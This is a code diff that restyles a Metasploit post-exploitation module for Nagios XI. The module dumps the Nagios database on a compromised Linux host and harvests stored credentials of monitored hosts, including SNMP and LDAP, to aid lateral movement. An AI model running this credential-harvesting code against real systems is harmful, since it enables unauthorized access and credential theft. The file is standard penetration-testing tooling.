@@ -11,22 +11,25 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        {
-          'Name' => 'Nagios XI Enumeration',
-          'Description' => %q{
-            NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials,
-            creating opportunities for lateral movement.
-          },
-          'License' => MSF_LICENSE,
-          'Author' => [
-            'Cale Smith', # @0xC413
-          ],
-          'DisclosureDate' => '2018-04-17',
-          'Platform' => 'linux',
-          'SessionTypes' => ['shell', 'meterpreter']
+        'Name' => 'Nagios XI Enumeration',
+        'Description' => %q{
+          NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials,
+          creating opportunities for lateral movement.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Cale Smith', # @0xC413
+        ],
+        'DisclosureDate' => '2018-04-17',
+        'Platform' => 'linux',
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
-      )
+    )
     register_options([
       OptString.new('DB_ROOT_PWD', [true, 'Password for DB root user, an option if they change this', 'nagiosxi' ])
     ])
@@ -70,10 +73,9 @@ class MetasploitModule < Msf::Post
       credential_data = {
         username: username
       }
-
     end
 
-    return credential_data
+    credential_data
   end
 
   def run
@@ -114,20 +116,20 @@ class MetasploitModule < Msf::Post
     if out.match(/error/i)
       print_error("Could not get DB contents: #{out.gsub(/\n/, ' ')}")
       return
-    else
-      db_dump = read_file(db_dump_file)
-      print_good('Nagios DB dump successful')
-      # store raw db results, there is likely good stuff in here that we don't parse out
-      db_loot = store_loot(
-        'nagiosxi_raw_db_dump',
-        'text/plain',
-        session,
-        db_dump,
-        nil
-      )
-      print_status("Raw Nagios DB dump #{db_loot}")
-      print_status("Look through the DB dump manually. There could be\ some good loot we didn't parse out.")
     end
+
+    db_dump = read_file(db_dump_file)
+    print_good('Nagios DB dump successful')
+    # store raw db results, there is likely good stuff in here that we don't parse out
+    db_loot = store_loot(
+      'nagiosxi_raw_db_dump',
+      'text/plain',
+      session,
+      db_dump,
+      nil
+    )
+    print_status("Raw Nagios DB dump #{db_loot}")
+    print_status("Look through the DB dump manually. There could be\ some good loot we didn't parse out.")
 
     CSV.parse(db_dump) do |row|
       case row[0]
@@ -245,7 +247,6 @@ class MetasploitModule < Msf::Post
         creds = row[2].split('!')
         password = ' '
         username = creds[0]
-        port = 161
 
         credential_data = {
           username: username,
@@ -277,9 +278,8 @@ class MetasploitModule < Msf::Post
           service_name: 'LDAP',
           protocol: 'tcp'
         }
-      else
-        # base case
       end
+
       unless credential_data.nil? || login_data.nil?
         report_obj(credential_data, login_data)
       end
